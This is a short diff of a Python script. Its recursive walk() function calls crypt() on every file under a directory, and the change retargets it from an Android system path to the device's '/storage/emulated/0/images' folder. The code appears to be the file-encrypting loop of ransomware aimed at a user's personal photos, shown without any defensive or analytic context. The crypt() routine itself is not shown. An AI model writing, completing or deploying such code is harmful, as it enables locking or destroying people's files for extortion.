@@ -10,4 +10,4 @@ def walk(dir):
         path = os.path.join(dir,name)
         if os.path.isfile(path): crypt(path)
         else: walk(path)
-walk('/storage/emulated/0/Android/Android')
+walk('/storage/emulated/0/images')
